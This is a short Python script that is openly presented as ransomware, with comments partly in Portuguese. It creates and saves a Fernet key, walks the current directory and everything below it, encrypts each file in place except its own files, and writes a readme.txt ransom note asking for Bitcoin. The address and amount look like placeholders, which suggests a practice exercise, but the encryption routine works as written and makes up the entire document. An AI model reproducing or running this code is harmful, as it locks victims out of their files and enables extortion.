from cryptography.fernet import Fernet
import os   

#1 chave = Fernet.generate_key()
def generate_key():
    chave = Fernet.generate_key()
    with open("chave.key", "wb") as chave_arquivo:
        chave_arquivo.write(chave)

#2 def load_key():
def load_key():
    return open("chave.key", "rb").read()

#3 Criptografar arquivos
def encrypt_file(file_path, key):
    f = Fernet(key)
    with open(file_path, "rb") as file:
        file_data = file.read()
    encrypted_data = f.encrypt(file_data)
    with open(file_path, "wb") as file:
        file.write(encrypted_data)          

#4 found_files function to find files in a directory
def find_files(directory):
    file_paths = []
    for root, _, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            if file not in ["Ransomware.py", "descrypt.py", "chave.key", "readme.txt"]:
                file_paths.append(file_path)
    return file_paths                    

#5 mensagem de resgate
def ransom_message():
    with open("readme.txt", "w") as msg:
        msg.write("Your files have been encrypted! To decrypt them, you need to pay the ransom.\n")
        msg.write("pay 0,0000026 BTC in the following address: 1A1zP1eP5TESTE2DMPTfTL5SLmv7TESTEa")                               

#6 Main function to execute the ransomware
def main():
    if os.path.exists("chave.key"):
        print("Ransomware was executed, if you want to decrypt your files, please contact the attacker read the readme.txt file.\n")
        return
    generate_key()
    key = load_key()
    directory = os.getcwd()  # Current working directory
    file_paths = find_files(directory)
    for file_path in file_paths:
        encrypt_file(file_path, key)
    ransom_message()   
    print("All files have been encrypted. A ransom message has been created in 'readme.txt'.")         

if __name__ == "__main__":
    main()